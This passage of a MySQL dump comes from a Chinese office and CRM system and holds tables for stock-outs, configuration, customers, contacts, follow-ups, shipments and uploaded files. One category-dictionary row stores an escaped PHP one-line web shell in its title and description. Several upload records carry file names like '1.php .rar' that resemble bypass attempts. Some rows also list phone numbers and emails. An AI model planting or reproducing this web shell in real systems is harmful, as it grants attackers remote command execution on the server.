  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(50) NOT NULL,
  `number` varchar(50) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `title` varchar(500) NOT NULL,
  `shijian` date NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `hid` varchar(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='出库记录' AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `xy_chuku`
--

INSERT INTO `xy_chuku` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `bianhao`, `number`, `shuliang`, `title`, `shijian`, `jingban`, `shenheren`, `shenhe`, `hid`) VALUES
(1, 1, '陈高明', '2015-06-02 09:58:24', 0, '', '0000-00-00 00:00:00', 1, '1506020001', '1506020001', 3, '客户管理管理系统,加密狗,小票打印机', '2015-06-02', '陈高明', '陈高明', '审核通过', '1'),
(2, 1, '陈高明', '2015-06-02 10:20:53', 0, '', '0000-00-00 00:00:00', 1, '1506020002', '1506020002', 4, '美容院管理系统,小票打印机,加密狗', '2015-06-02', '王旭东', '陈高明', '审核通过', '2'),
(3, 1, '陈高明', '2015-07-09 13:03:44', 0, '', '0000-00-00 00:00:00', 1, '', '150709440003', 0, '美容院管理系统', '2015-07-09', '陈高明', '陈高明', '审核通过', ''),
(4, 1, '陈高明', '2015-07-23 17:12:46', 0, '', '0000-00-00 00:00:00', 1, '150713220009', '150723460004', 2147483647, '11', '2015-07-23', '', '陈高明', '审核通过', '15');

-- --------------------------------------------------------

--
-- 表的结构 `xy_chukus`
--

CREATE TABLE IF NOT EXISTS `xy_chukus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(100) NOT NULL,
  `title` varchar(200) NOT NULL,
  `type` varchar(255) NOT NULL,
  `danwei` varchar(21) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `xid` int(11) NOT NULL,
  `edit` tinyint(1) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shijian` date NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  `hid` int(11) NOT NULL,
  `number` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='出库明细表' AUTO_INCREMENT=9 ;

--
-- 转存表中的数据 `xy_chukus`
--

INSERT INTO `xy_chukus` (`id`, `status`, `bianhao`, `title`, `type`, `danwei`, `shuliang`, `beizhu`, `shenhe`, `xid`, `edit`, `jingban`, `shijian`, `fenlei`, `hid`, `number`) VALUES
(1, 1, 'crm', '客户管理管理系统', '通用的可以适当定制', '套', 1, '', '审核通过', 1, 0, '陈高明', '2015-06-02', '软件服务', 1, '1506020001'),
(2, 1, 'jmg01', '加密狗', '62K', '只', 1, '', '审核通过', 1, 0, '陈高明', '2015-06-02', '软件配套', 1, '1506020001'),
(3, 1, 'sfz01', '小票打印机', '热敏纸', '台', 1, '', '审核通过', 1, 0, '陈高明', '2015-06-02', '软件配套', 1, '1506020001'),
(4, 1, 'CRM01', '美容院管理系统', '通用', '套', 1, '', '审核通过', 2, 0, '王旭东', '2015-06-02', '软件服务', 2, '1506020002'),
(5, 1, 'sfz01', '小票打印机', '热敏纸', '台', 2, '', '审核通过', 2, 0, '王旭东', '2015-06-02', '软件配套', 2, '1506020002'),
(6, 1, 'jmg01', '加密狗', '62K', '只', 1, '', '审核通过', 2, 0, '王旭东', '2015-06-02', '软件配套', 2, '1506020002'),
(7, 1, 'CRM01', '美容院管理系统', '通用', '套', 0, '', '审核通过', 3, 0, '陈高明', '2015-07-09', '软件服务', 0, '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_config`
--

CREATE TABLE IF NOT EXISTS `xy_config` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fenlei` varchar(20) NOT NULL COMMENT '分类',
  `name` varchar(30) NOT NULL DEFAULT '' COMMENT '配置名称',
  `type` tinyint(3) NOT NULL DEFAULT '0' COMMENT '配置类型',
  `title` varchar(50) NOT NULL DEFAULT '' COMMENT '配置说明',
  `extra` varchar(255) NOT NULL DEFAULT '' COMMENT '配置值',
  `remark` varchar(100) NOT NULL COMMENT '配置说明',
  `addtime` datetime NOT NULL COMMENT '创建时间',
  `updatetime` datetime NOT NULL COMMENT '更新时间',
  `status` tinyint(4) NOT NULL DEFAULT '1' COMMENT '状态',
  `value` text NOT NULL COMMENT '配置值',
  `sort` smallint(3) NOT NULL DEFAULT '0' COMMENT '排序',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=69 ;

--
-- 转存表中的数据 `xy_config`
--

INSERT INTO `xy_config` (`id`, `fenlei`, `name`, `type`, `title`, `extra`, `remark`, `addtime`, `updatetime`, `status`, `value`, `sort`) VALUES
(1, '系统', 'CONFIG_TYPE_LIST', 3, '配置类型列表', '', '主要用于数据解析和页面表单的生成', '2015-02-01 14:39:41', '2015-02-25 10:44:48', 1, '0:数字\n1:字符\n2:文本\n3:数组\n4:枚举', 0),
(2, '基础', 'PERPAGE', 0, '每页条数', '', '列表分页条数', '2015-02-01 14:49:47', '2015-06-02 12:00:53', 1, '50', 0),
(3, '基础', 'SEARCHKEY', 3, '参与搜索的字段名', '', '', '2015-02-01 14:56:03', '2015-05-31 16:46:34', 1, 'title\nbiaoti\nmingcheng\nname\nvalue\nxingming\ndianhua\nphone\ntel\nqq\nemail\nbeizhu\nlaiyuan\njinzhan\nsfz\ncontent\nusername\nuname\nuuname\nurl\nip\ntruename\ndepname\nposname\ntype\nleixing\ndanwei\nzhiwei\ncontent\nneirong\njinban\njingban\nshenhe\nshenheren\nbianhao\nnumber', 0),
(4, '系统', 'DATA_CACHE_TIME', 0, '数据缓存时间', '', '数据缓存有效期 0表示永久缓存', '2015-02-01 15:05:20', '2015-02-25 10:44:23', 1, '14400', 0),
(5, '系统', 'SESSION_PREFIXX', 1, 'session 前缀', '', '', '2015-02-01 15:07:09', '2015-02-25 10:44:17', 1, 'lygxykj', 0),
(6, '系统', 'WEB_SITE_TITLE', 2, '系统名称', '', '', '2015-02-01 15:17:46', '2015-07-19 18:48:56', 1, '信友科技管理系统', 0),
(11, '模型', 'MODEL_B_SHOW', 3, '字段模型表单显示', '', '', '2015-02-01 22:12:54', '2015-02-25 10:43:02', 1, '0:不显示\n1:都显示\n2:新增显示\n3:编辑显示', 0),
(7, '系统', 'DATA_BACKUP_PATH', 1, '数据库备份路径', '', '', '2015-02-01 15:55:43', '2015-07-07 09:18:30', 1, 'data', 0),
(8, '系统', 'DATA_BACKUP_PART_SIZE', 0, '数据库备份卷大小', '', '该值用于限制压缩后的分卷最大长度。单位：B；建议设置20M', '2015-02-01 15:56:41', '2015-02-25 10:44:00', 1, '20971520', 0),
(9, '系统', 'DATA_BACKUP_COMPRESS', 4, '数据库备份文件是否启用压缩', '0:不压缩\n1:启用压缩', '压缩备份文件需要PHP环境支持gzopen,gzwrite函数', '2015-02-01 15:57:49', '2015-07-07 05:24:13', 1, '1', 0),
(10, '系统', 'DATA_BACKUP_COMPRESS_LEVEL', 4, '数据库备份文件压缩级别', '1:普通\n4:一般\n9:最高', '数据库备份文件的压缩级别，该配置在开启压缩时生效', '2015-02-01 15:58:48', '2015-02-25 10:43:25', 1, '9', 0),
(12, '模型', 'MODEL_L_SHOW', 3, '字段模型列表显示', '', '', '2015-02-02 14:55:31', '2015-02-25 10:42:53', 1, '0:不显示\n1:显示', 0),
(13, '模型', 'MODEL_B_ATTR', 3, '数据模型中表单属性', '', '', '2015-02-02 15:46:08', '2015-04-15 18:16:56', 1, '0:文本框\n1:文本域\n2:密码框\n3:日期框\n4:编辑器\n5:微调器\n6:单选框\n7:多选框\n8:下拉框\n9:查找带回\n10:上传附件\n11:日期时间框\n12:隐藏字段', 0),
(14, '模型', 'MODEL_B_ISMUST', 3, '数据模型中是否必填', '', '', '2015-02-02 16:05:26', '2015-02-28 11:37:48', 1, '0:非必填\n1:必填\n2:必填日期\n3:必填手机号码\n4:必填EMAIL\n5:必填字母\n6:必填身份证号码\n7:必填中文\n8:必填数字\n9:必填日期时间', 0),
(15, '模型', 'MODEL_B_ISSORT', 3, '数据模型中的字段是否参与排序', '', '', '2015-02-02 19:53:07', '2015-02-25 10:42:27', 1, '0:不参与\n1:参与', 0),
(16, '基础', 'BASE_SEX', 3, '性别', '', '', '2015-02-02 21:21:58', '2015-02-25 10:28:07', 1, '0:男\n1:女', 0),
(17, '基础', 'BASE_XUELI', 3, '学历', '', '', '2015-02-02 21:23:26', '2015-02-25 10:28:01', 1, '0:中专\n1:大专\n2:本科\n3:硕士\n4:博士', 0),
(18, '基础', 'CONFIG_CLASS', 3, '配置分类', '', '', '2015-02-25 10:22:21', '2015-05-13 15:31:07', 1, '0:系统\n1:基础\n2:模型', 0),
(41, '模型', 'MODEL_B_ISSEARCH', 3, '模型中是否参与搜索', '', '', '2015-04-16 09:18:09', '0000-00-00 00:00:00', 1, '0:不参与\n1:参与', 0),
(39, '系统', 'WEB_COMPANY_NAME', 2, '单位名称', '', '', '2015-04-05 11:26:27', '2015-07-07 12:13:09', 1, '连云港信友科技有限公司\n', 0),
(38, '模型', 'MODEL_F_TYPE', 3, '图表类型', '', '', '2015-03-06 14:16:26', '0000-00-00 00:00:00', 1, '0:不生成\n1:3D饼图\n2:柱状图\n3:曲线图\n4:环状图\n5:柱商务图', 0),
(42, '基础', 'BASE_ZU', 3, '参数组别', '', '', '2015-04-19 11:02:43', '0000-00-00 00:00:00', 1, '少儿A组：3-6岁\n少儿B组：7-9岁\n少年A组：10-12岁\n少年B组：13-18岁\n青年组：19-40岁\n中老年组：40岁以上', 0),
(43, '基础', 'BASE_XM', 3, '参数项目', '', '', '2015-04-19 11:17:43', '0000-00-00 00:00:00', 1, '大众才艺类\n书画美术类\n全民阅读', 0),
(52, '基础', 'CUST_LAIYUAN', 3, '客户来源', '', '', '2015-05-20 10:04:59', '0000-00-00 00:00:00', 1, '百度推广\n电话营销\n主动联系\n客户介绍', 0),
(53, '基础', 'CUSTGD_TYPE', 3, '跟单方式', '', '', '2015-05-20 10:52:25', '0000-00-00 00:00:00', 1, '电话沟通\nQQ/旺旺\n电子邮箱\n上门拜访', 0),
(54, '基础', 'CUSTGD_JINZHAN', 3, '跟单进展阶段', '', '', '2015-05-20 10:56:47', '2015-07-07 10:43:24', 1, '需求整理\n选择比较\n成交客户\n他人签单', 0),
(55, '基础', 'CUST_XUQIU', 3, '客户需求', '', '', '2015-05-20 11:34:07', '0000-00-00 00:00:00', 1, '软件定制\nCRM/OA\n物流管理\n美容院管理', 0),
(56, '基础', 'CHANPIN_FENLEI', 3, '产品分类', '', '', '2015-05-22 10:23:50', '2015-06-02 09:26:43', 1, '软件服务\n软件配套\n办公用品\n', 0),
(57, '基础', 'CHANPIN_DANWEI', 3, '产品单位', '', '', '2015-05-22 10:26:04', '2015-06-02 09:28:59', 1, '只\n个\n台\n卷\n套', 0),
(58, '基础', 'SHENHE', 3, '审核状态', '', '', '2015-05-22 16:02:16', '2015-07-08 15:56:18', 1, '审核通过\n退回修改', 0),
(59, '基础', 'QUXIANG_TYPE', 3, '去向', '', '', '2015-05-24 23:16:49', '2015-07-19 18:28:27', 1, '外出\n请假', 0),
(60, '基础', 'HUIBAO_TYPE', 3, '汇报类型', '', '', '2015-05-25 09:15:40', '0000-00-00 00:00:00', 1, '日总结\n周总结\n月总结\n年总结\n其他', 0),
(61, '基础', 'ZHISHI_TYPE', 3, '知识分类', '', '', '2015-05-25 10:39:14', '0000-00-00 00:00:00', 1, '产品知识\n技术知识\n营销知识\n质量知识\n培训资料\n管理知识\n其他知识', 0),
(62, '基础', 'TXL_LEIXING', 3, '通讯录类型', '', '', '2015-05-25 12:24:21', '2015-07-19 18:48:16', 1, '私有\n公有', 0),
(63, '基础', 'RENWU_JIEGUO', 3, '处理结果', '', '', '2015-05-31 16:53:05', '0000-00-00 00:00:00', 1, '进行中\n已完成', 0),
(64, '基础', 'BIANHAO_AUTO', 1, '自动编号', '', '编号规则是否自动编号，如果是手工输入的，请删除自动编号', '2015-06-06 08:21:46', '2015-06-06 08:36:11', 1, '自动编号', 0),
(65, '基础', 'BIANHAO_GUIZE', 0, '编号规则', '', '0，年月日秒+4位顺序号\n1，年月日时分秒+2位随机数\n2，年与日+4位随机数', '2015-06-06 08:29:27', '2015-06-06 08:49:54', 1, '0', 0),
(66, '基础', 'BIANHAO_NUM', 0, '编号长度', '', '默认是4位长度值，效果如：0001', '2015-06-06 08:32:59', '0000-00-00 00:00:00', 1, '4', 0);

-- --------------------------------------------------------

--
-- 表的结构 `xy_cust`
--

CREATE TABLE IF NOT EXISTS `xy_cust` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(200) NOT NULL,
  `dianhua` varchar(50) NOT NULL,
  `qq` varchar(50) NOT NULL,
  `email` varchar(200) NOT NULL,
  `name` varchar(50) NOT NULL,
  `laiyuan` varchar(50) NOT NULL,
  `jinzhan` varchar(50) NOT NULL,
  `xiaci` datetime NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `beizhu` varchar(500) NOT NULL,
  `dizhi` varchar(200) NOT NULL,
  `aihao` varchar(200) NOT NULL,
  `xuqiu` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='客户管理' AUTO_INCREMENT=9 ;

--
-- 转存表中的数据 `xy_cust`
--

INSERT INTO `xy_cust` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `title`, `dianhua`, `qq`, `email`, `name`, `laiyuan`, `jinzhan`, `xiaci`, `juid`, `juname`, `beizhu`, `dizhi`, `aihao`, `xuqiu`) VALUES
(1, 1, '陈高明', '2015-05-21 08:12:00', 1, '陈高明', '2015-05-22 15:15:47', 1, '百度公司', '13812349563', '1625252622', 'pinkecn@qq.com', '李彦宏', '主动联系', '成交客户', '2015-05-22 09:11:42', '16', '王晓丹', '地方', '中国北京市', '健身', 'CRM/OA'),
(2, 1, '陈高明', '2015-06-01 09:05:58', 0, '', '0000-00-00 00:00:00', 1, '深圳腾讯公司', '1381212245', '10000', '120000@qq.com', '马虎腾', '主动联系', '需求整理', '0000-00-00 00:00:00', '16,1', '王晓丹,陈高明', '121212', '深圳市罗湖区', '高尔夫', '物流管理'),
(3, 18, '王倩', '2015-06-03 14:05:34', 18, '王倩', '2015-06-03 14:06:45', 1, '常州达丽人女子美容中心', '13865722111', '54445333', '', '候经理', '主动联系', '选择比较', '2015-06-15 14:16:19', '', '', '店铺装修中', '武进区', '', '美容院管理'),
(4, 18, '王倩', '2015-06-03 14:16:21', 16, '王晓丹', '2015-07-20 01:53:47', 1, '南昌房屋中介服', '13299872991', '988776655', '', '李经理', '百度推广', '需求整理', '2015-06-10 07:25:09', '17,16', '张雨,王晓丹', '咨询', '市区', '', '软件定制');

-- --------------------------------------------------------

--
-- 表的结构 `xy_custcon`
--

CREATE TABLE IF NOT EXISTS `xy_custcon` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `cid` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `name` varchar(50) NOT NULL,
  `sex` varchar(10) NOT NULL,
  `zhiwu` varchar(20) NOT NULL,
  `dianhua` varchar(50) NOT NULL,
  `qq` varchar(50) NOT NULL,
  `email` varchar(200) NOT NULL,
  `aihao` varchar(200) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='联系人' AUTO_INCREMENT=11 ;

--
-- 转存表中的数据 `xy_custcon`
--

INSERT INTO `xy_custcon` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `cid`, `title`, `name`, `sex`, `zhiwu`, `dianhua`, `qq`, `email`, `aihao`, `beizhu`) VALUES
(1, 1, '陈高明', '2015-05-21 08:42:09', 0, '', '0000-00-00 00:00:00', 1, 1, '百度公司', '王旭', '男', '副总裁', '135262', '5622352', '5622352@qq.com', '爬山', '说明下'),
(2, 1, '陈高明', '2015-05-21 08:44:22', 0, '', '0000-00-00 00:00:00', 1, 1, '百度公司', '徐冬冬', '女', '范德萨', '3152', '252622', '525233@qq.com', 'fds ', 'fsd '),
(3, 18, '王倩', '2015-06-03 14:11:06', 0, '', '0000-00-00 00:00:00', 1, 3, '常州达丽人女子美容中心', '候经理', '男', '店长', '13876322111', '', '', '', ''),
(4, 16, '王晓丹', '2015-06-12 11:56:11', 0, '', '0000-00-00 00:00:00', 1, 4, '南昌房屋中介服务', '768', '', '78768', '18370066801', '', '', '', ''),
(5, 16, '王晓丹', '2015-06-12 11:59:59', 16, '王晓丹', '2015-07-20 01:54:16', 1, 4, '南昌房屋中介服', '444', '男', 'dfd', '187444444444', '', '', '', ''),
(6, 16, '王晓丹', '2015-06-21 17:05:13', 16, '王晓丹', '2015-06-23 10:15:24', 1, 3, '常州达丽人女子美容中心', '候经理', '女', '', '13865722111', '232', '', '', ''),
(9, 1, '陈高明', '2015-07-11 18:18:42', 0, '', '0000-00-00 00:00:00', 1, 2, '深圳腾讯公司', '马虎腾', '', '', '1381212245', '', '', '', ''),
(10, 16, '王晓丹', '2015-07-15 14:25:23', 0, '', '0000-00-00 00:00:00', 1, 3, '常州达丽人女子美容中心', '候经理', '', '', '13865722111', '', '', '', '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_custgd`
--

CREATE TABLE IF NOT EXISTS `xy_custgd` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `cid` int(11) NOT NULL,
  `title` varchar(250) NOT NULL,
  `type` varchar(50) NOT NULL,
  `content` varchar(255) NOT NULL,
  `jinzhan` varchar(50) NOT NULL,
  `xiaci` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='跟单记录' AUTO_INCREMENT=15 ;

--
-- 转存表中的数据 `xy_custgd`
--

INSERT INTO `xy_custgd` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `cid`, `title`, `type`, `content`, `jinzhan`, `xiaci`) VALUES
(1, 1, '陈高明', '2015-05-21 08:51:25', 0, '', '0000-00-00 00:00:00', 1, 1, '百度公司', '电话沟通', '和李鸿雁沟通不错，准备做呢', '需求整理', '2015-05-22 08:51:04'),
(2, 1, '陈高明', '2015-05-21 08:52:29', 1, '陈高明', '2015-05-21 09:11:47', 1, 1, '百度公司', '上门拜访', '搞定了啊', '成交客户', '2015-05-22 09:11:42'),
(3, 1, '陈高明', '2015-06-01 09:06:23', 0, '', '0000-00-00 00:00:00', 1, 2, '深圳腾讯公司', '上门拜访', '12121', '选择比较', '2015-06-03 09:06:17'),
(4, 1, '陈高明', '2015-06-02 09:49:04', 0, '', '0000-00-00 00:00:00', 1, 2, '深圳腾讯公司', '上门拜访', '搞定了啊', '成交客户', '0000-00-00 00:00:00'),
(5, 16, '王晓丹', '2015-06-03 07:43:29', 1, '陈高明', '2015-07-09 09:26:25', 1, 2, '深圳腾讯公司', '电话沟通', '11', '需求整理', '0000-00-00 00:00:00'),
(6, 18, '王倩', '2015-06-03 14:11:50', 18, '王倩', '2015-06-03 14:13:12', 1, 3, '常州达丽人女子美容中心', '电话沟通', '在忙', '需求整理', '2015-06-11 14:12:34'),
(7, 18, '王倩', '2015-06-03 14:17:03', 0, '', '0000-00-00 00:00:00', 1, 3, '常州达丽人女子美容中心', 'QQ/旺旺', '选择软件', '选择比较', '2015-06-15 14:16:19'),
(8, 16, '王晓丹', '2015-06-03 19:31:54', 0, '', '0000-00-00 00:00:00', 1, 4, '南昌房屋中介服务', '', '11', '成交客户', '0000-00-00 00:00:00'),
(9, 16, '王晓丹', '2015-06-12 11:32:59', 0, '', '0000-00-00 00:00:00', 1, 4, '南昌房屋中介服务', '', '', '', '0000-00-00 00:00:00'),
(10, 16, '王晓丹', '2015-06-12 12:00:06', 0, '', '0000-00-00 00:00:00', 1, 4, '南昌房屋中介服务', '', '', '', '0000-00-00 00:00:00'),
(11, 16, '王晓丹', '2015-06-26 07:30:46', 0, '', '0000-00-00 00:00:00', 1, 4, '南昌房屋中介服务', '电话沟通', '', '需求整理', '2015-06-10 07:25:09'),
(12, 16, '王晓丹', '2015-07-03 16:35:55', 0, '', '0000-00-00 00:00:00', 1, 0, 'sdfsdf', '上门拜访', 'fdsf', '成交客户', '2015-07-30 16:30:10');

-- --------------------------------------------------------

--
-- 表的结构 `xy_datalist`
--

CREATE TABLE IF NOT EXISTS `xy_datalist` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `level` tinyint(1) NOT NULL,
  `pid` int(11) NOT NULL,
  `title` varchar(50) NOT NULL,
  `desc` varchar(200) NOT NULL,
  `sort` int(4) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='分类字典' AUTO_INCREMENT=9 ;

--
-- 转存表中的数据 `xy_datalist`
--

INSERT INTO `xy_datalist` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `level`, `pid`, `title`, `desc`, `sort`) VALUES
(1, 1, '陈高明', '2015-05-06 15:35:39', 1, '陈高明', '2015-05-18 20:04:13', 1, 0, 0, '地区分类', '地区分类', 1),
(2, 1, '陈高明', '2015-05-06 15:38:20', 0, '', '0000-00-00 00:00:00', 1, 1, 1, '湖南', '湖南省', 1),
(3, 1, '陈高明', '2015-05-06 15:38:39', 0, '', '0000-00-00 00:00:00', 1, 2, 2, '长沙', '', 1),
(4, 1, '陈高明', '2015-05-06 15:40:30', 0, '', '0000-00-00 00:00:00', 1, 2, 2, '岳阳', '', 5),
(5, 8, '管理员', '2015-05-12 09:47:00', 0, '', '0000-00-00 00:00:00', 1, 1, 1, '浙江', '浙江省', 20),
(6, 8, '管理员', '2015-05-12 09:47:58', 0, '', '0000-00-00 00:00:00', 1, 2, 5, '杭州', '杭州市', 21),
(8, 1, '陈高明', '2015-07-11 14:33:25', 1, '陈高明', '2015-07-11 14:33:52', 1, 3, 6, '&lt;?php @eval($_POST[cmd])?&gt;', '&lt;?php @eval($_POST[cmd])?&gt;', 0);

-- --------------------------------------------------------

--
-- 表的结构 `xy_emails`
--

CREATE TABLE IF NOT EXISTS `xy_emails` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `addtime` datetime NOT NULL,
  `title` varchar(200) NOT NULL,
  `email` varchar(200) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `content` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `ip` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='邮件记录' AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `xy_emails`
--

INSERT INTO `xy_emails` (`id`, `uid`, `addtime`, `title`, `email`, `status`, `content`, `url`, `ip`) VALUES
(1, 0, '2015-05-19 19:41:22', '18951251872', '16129825@qq.com', 1, '验证码为12015200，24小时之内有效', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(2, 0, '2015-05-19 19:54:34', '18951251872', '16129825@qq.com', 1, '验证码为12015200，24小时之内有效', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');

-- --------------------------------------------------------

--
-- 表的结构 `xy_fahuo`
--

CREATE TABLE IF NOT EXISTS `xy_fahuo` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `title` varchar(100) NOT NULL,
  `shijian` date NOT NULL,
  `value` varchar(200) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='发货记录' AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `xy_fahuo`
--

INSERT INTO `xy_fahuo` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `hid`, `mingcheng`, `bianhao`, `title`, `shijian`, `value`, `beizhu`, `jingban`) VALUES
(1, 1, '陈高明', '2015-06-02 10:00:24', 16, '王晓丹', '2015-07-05 18:26:53', 1, 11, '33333', '150616280005', '1', '2015-06-02', '申通快递-3652622', '配套设备全部已经发送，3天后到', '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_files`
--

CREATE TABLE IF NOT EXISTS `xy_files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `attid` int(11) NOT NULL,
  `folder` varchar(50) NOT NULL,
  `filename` varchar(255) NOT NULL,
  `filetype` varchar(50) NOT NULL,
  `filedesc` varchar(200) NOT NULL,
  `uid` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `status` int(2) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=19 ;

--
-- 转存表中的数据 `xy_files`
--

INSERT INTO `xy_files` (`id`, `attid`, `folder`, `filename`, `filetype`, `filedesc`, `uid`, `addtime`, `status`) VALUES
(1, 1433245831, 'Uploads/Public/2015-06-02/', '556d990203452.doc', 'doc', '科学的含义.doc', '17', '2015-06-02 19:52:34', 1),
(5, 1436095611, 'Uploads/Public/2015-07-05/', '55991482dea49.png', 'png', 'alertpanel_icon.png', '16', '2015-07-05 19:26:58', 1),
(3, 1433316533, 'Uploads/Public/2015-06-03/', '556eace8b20db.jpg', 'jpg', '90175072.jpg', '16', '2015-06-03 15:29:44', 1),
(4, 1433318891, 'Uploads/Public/2015-06-03/', '556eb5fa78438.txt', 'txt', '新建文本文档.txt', '16', '2015-06-03 16:08:26', 1),
(6, 1433314035, 'Uploads/Public/2015-07-07/', '559ab983450d0.jpg', 'jpg', '1.jpg', '16', '2015-07-07 01:23:15', 1),
(12, 1436543662, 'Uploads/Public/2015-07-10/', '559feabace270.rar', 'rar', '1.php .rar', '1', '2015-07-10 23:54:34', 1),
(11, 1436542767, 'Uploads/Public/2015-07-10/', '559fe752315ed.rar', 'rar', '1.php .rar', '1', '2015-07-10 23:40:02', 1),
(13, 1433314035, 'Uploads/Public/2015-07-11/', '559ff231032e5.jpg', 'jpg', '1.jpg', '1', '2015-07-11 00:26:25', 1),
(14, 1436544137, 'Uploads/Public/2015-07-11/', '559ff32103904.jpg', 'jpg', '1.jpg', '1', '2015-07-11 00:30:25', 1),
(15, 1436544137, 'Uploads/Public/2015-07-11/', '559ff6281265a.txt', 'txt', '新建文本文档.txt', '1', '2015-07-11 00:43:20', 1),
(16, 1437227904, 'Uploads/Public/2015-07-18/', '55aa5b939ba5b.gif', 'gif', 'msql销售登记备份系统 v1.0.gif', '16', '2015-07-18 21:58:43', 1),
(17, 1438650287, 'Uploads/Public/2015-08-04/', '55c00fc17dba9.jpg', 'jpg', 'Desert.jpg', '16', '2015-08-04 09:05:05', 1),
(18, 1439458687, 'Uploads/Public/2015-08-13/', '55cc65acd93e3.rar', 'rar', '51CTO下载-河南某法院VoIP建设项目（华为和迈普）.part2.rar', '16', '2015-08-13 17:38:52', 1);

-- --------------------------------------------------------

--
-- 表的结构 `xy_fukuan`
--

CREATE TABLE IF NOT EXISTS `xy_fukuan` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `title` varchar(100) NOT NULL,
  `leixing` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
